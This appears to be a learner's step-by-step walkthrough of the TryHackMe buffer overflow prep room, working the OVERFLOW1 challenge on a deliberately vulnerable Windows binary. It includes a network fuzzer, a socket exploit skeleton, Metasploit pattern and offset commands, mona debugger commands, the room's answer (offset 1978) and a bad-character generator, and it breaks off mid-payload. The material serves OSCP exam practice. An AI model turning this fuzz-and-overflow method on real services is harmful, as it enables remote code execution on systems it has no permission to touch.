https://tryhackme.com/r/room/bufferoverflowprep
Practice stack based buffer overflows!

# Task 1 Deploy VM

This room uses a 32-bit Windows 7 VM with Immunity Debugger and Putty preinstalled. Windows Firewall and Defender have both been disabled to make exploit writing easier.

You can log onto the machine using RDP with the following credentials: admin/password

I suggest using the xfreerdp command: `xfreerdp /u:admin /p:password /cert:ignore /v:10.10.111.161 /workarea /tls-seclevel:0   `

If Windows prompts you to choose a location for your network, choose the "Home" option.

On your Desktop there should be a folder called "vulnerable-apps". Inside this folder are a number of binaries which are vulnerable to simple stack based buffer overflows (the type taught on the PWK/OSCP course):

- The SLMail installer.
- The brainpan binary.
- The dostackbufferoverflowgood binary.
- The vulnserver binary.
- A custom written "oscp" binary which contains 10 buffer overflows, each with a different EIP offset and set of badchars.

I have also written a handy guide to exploiting buffer overflows with the help of mona: [https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst)[](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst)

Please note that this room does not teach buffer overflows from scratch. It is intended to help OSCP students and also bring to their attention some features of mona which will save time in the OSCP exam.

Thanks go to [@Mojodojo_101](https://twitter.com/Mojodojo_101) for helping create the custom oscp.exe binary for this room!  

### Answer the questions below

**Deploy the VM and login using RDP.**



# Task 2 oscp.exe - OVERFLOW1

1. In Kali. Using Remmina, remote to target machine.

![800](img/Pasted%20image%2020240821141857.png)


2. In target machine. Right click Immunity Debugger > Run as administrator. File > Open > Desktop\\vulnerable-apps\\oscp\\oscp. Click red play button, will show Running. 

![800](img/Pasted%20image%2020240821141958.png)


4. In Kali. Open a terminal. NC to the target machine with port 1337. Type "HELP" to view the commands. Type "OVERFLOW1 test" to verify.

![800](img/Pasted%20image%2020240821142159.png)


5. In target machine. In the Immunity Debugger. Input the mona command.

`!mona config -set workingfolder c:\mona\%p`

![800](img/Pasted%20image%2020240821142317.png)


6. In Kali. Create a script, fuzzer.py.

```python
#!/usr/bin/env python3

import socket, time, sys  # Import necessary modules: socket for networking, time for delays, sys for exiting the script

# Define the target IP address or hostname
ip = "target.local"

# Define the target port number
port = 1337

# Set the timeout duration (in seconds) for the socket connection
timeout = 5

# Define a prefix to prepend to the payload being sent
prefix = "OVERFLOW1 "

# Initialize the payload with the prefix followed by 100 "A" characters
string = prefix + "A" * 100

# Start an infinite loop to continually send increasing payload sizes
while True:
    try:
        # Create a new socket object for IPv4 (AF_INET) and TCP (SOCK_STREAM)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            # Set the timeout for the socket connection
            s.settimeout(timeout)
            
            # Connect to the target IP and port
            s.connect((ip, port))
            
            # Receive the initial response from the server (optional step to ensure connection)
            s.recv(1024)
            
            # Print the current size of the payload being sent (excluding the prefix)
            print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
            
            # Send the payload to the target server, encoding it as a Latin-1 byte string
            s.send(bytes(string, "latin-1"))
            
            # Receive the server's response (optional step to ensure the payload was sent)
            s.recv(1024)
    
    # If an exception occurs (e.g., the server crashes or connection fails), handle it here
    except:
        # Print the size of the payload that caused the crash and exit the script
        print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
        sys.exit(0)
    
    # Increase the size of the payload by 100 "A" characters for the next iteration
    string += 100 * "A"
    
    # Wait 1 second before sending the next payload (to avoid overwhelming the server)
    time.sleep(1)

```


7. In Kali. Create a script, exploit.py.

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW1 "  # The command or identifier expected by the target service
offset = 0             # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = ""              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = ""           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details

```


8. In target machine. Immunity Debugger > Debug > Restart > Play.


9. In Kali. Execute the fuzzer.py. The Immunity Debugger will crash and pause.

![800](img/Pasted%20image%2020240821144520.png)


10. Fuzzing crashed at 2000 bytes. Offset range 1900 to 2000 bytes. Create a pattern by adding 400 bytes, total of 2400 bytes. 

![800](img/Pasted%20image%2020240821145004.png)


11. Immunity Debugger showing EIP 41414141 overwritten with A(hex=41).

![800](img/Pasted%20image%2020240821145237.png)


12. In Kali. Create msf pattern.

`msf-pattern_create -l 2400`

```shell
┌──(root㉿kali)-[/transfer]
└─# msf-pattern_create -l 2400   
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9
```


13. In Kali. Edit the script exploit.py and add the output of the msf-pattern.

```python
import socket
ip = "target.local"
port = 1337
prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9"
postfix = ""
buffer = prefix + overflow + retn + padding + payload + postfix
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```


14. In target machine. Immunity Debugger > Debug > Restart > Play.


15. In Kali. Execute the exploit.py.

![](img/Pasted%20image%2020240821150355.png)


16. Immunity Debugger. EIP 6F43396E.

![800](img/Pasted%20image%2020240821150526.png)


17. In Kali. Get the offset value of the EIP.

```bash
┌──(root㉿kali)-[/transfer]
└─# msf-pattern_offset -l 2300 -q 6F43396E
[*] Exact match at offset 1978
```

Alternative, get it from Immunity Debugger using mona command.

`!mona findmsp -distance 2400`

![800](img/Pasted%20image%2020240821151845.png)

EIP Offset is 1978.

	Task 1
		a. What is the EIP offset for OVERFLOW1?
			1978 


18. In Kali. Edit the exploit.py. Add the offset 1978 and put a retn to be reflected, can use "BBBB"

```python
import socket  # Import the socket module to enable network communication

# Target details
ip = "target.local"  # The IP address or hostname of the target machine
port = 1337  # The port number on the target machine to connect to

# Buffer overflow exploit components
prefix = "OVERFLOW1 "  # Prefix to identify the start of the input buffer
offset = 1978  # Number of bytes to reach the return address (overwrite point)
overflow = "A" * offset  # Fills the buffer up to the return address with 'A's
retn = "BBBB"  # Placeholder for the return address, overwrites the EIP/RIP
padding = ""  # Any additional padding (not used in this example)
# Pattern of characters used to help locate the exact overwrite point in EIP/RIP
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9"
postfix = ""  # Any additional data to send after the payload (not used here)

# Construct the complete buffer to send
buffer = prefix + overflow + retn + padding + payload + postfix

# Create a TCP socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    # Attempt to connect to the target IP and port
    s.connect((ip, port))
    print("Sending evil buffer...")  # Notify that the buffer is being sent
    # Send the buffer over the network to the target
    s.send(bytes(buffer + "\r\n", "latin-1"))
    print("Done!")  # Confirm that the buffer has been sent
except:
    # If the connection fails, print an error message
    print("Could not connect.")

```


19. In target machine. Immunity Debugger > Debug > Restart > Play.


20. In Kali. Execute exploit.py.

![800](img/Pasted%20image%2020240821152534.png)


21. Immunity Debugger, showing EIP was overwritten with 42424242 which is the "BBBB". Note the value ESP 0187FA30.

![800](img/Pasted%20image%2020240827175645.png)


22. In Immunity Debugger. Create a BADCHARS using mona. By default the syntax \\x00 is a BADCHAR.

`!mona bytearray -b "\x00"`

![800](img/Pasted%20image%2020240827175832.png)


23. Creating bad chars. In Kali. By using a python script. Generate a string of bad chars from \\x01 to \\xff.

```python
#!/usr/bin/env python3

from __future__ import print_function

#tart with 00 and add any others you find
bad = "00".split()

#turns them into a nice string to copy into python
print("badchars = ")
for x in range(1, 256):
	if "{:02x}".format(x) not in bad: 
		print("\\x" + "{:02x}".format(x), end='')

#creates a nice string to use in Mona
print("\n\nfor mona")
for byte in bad:
	print("\\x{}".format(byte), end='')
print()
```

```shell
┌──(root㉿kali)-[/transfer]
└─# python3 create.py
badchars = 
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff

for mona
\x00
```


24. Using the generated bad chars, copy and edit the exploit.py.

```python
import socket  # Import the socket module to enable network communication

# Target details
ip = "target.local"  # The IP address or hostname of the target machine
port = 1337  # The port number on the target machine to connect to

# Buffer overflow exploit components
prefix = "OVERFLOW1 "  # Prefix to identify the start of the input buffer
offset = 1978  # Number of bytes to reach the return address (overwrite point)
overflow = "A" * offset  # Fills the buffer up to the return address with 'A's
retn = "BBBB"  # Placeholder for the return address, overwrites the EIP/RIP
padding = ""  # Any additional padding (not used in this example)
# Generated bad chars
payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\x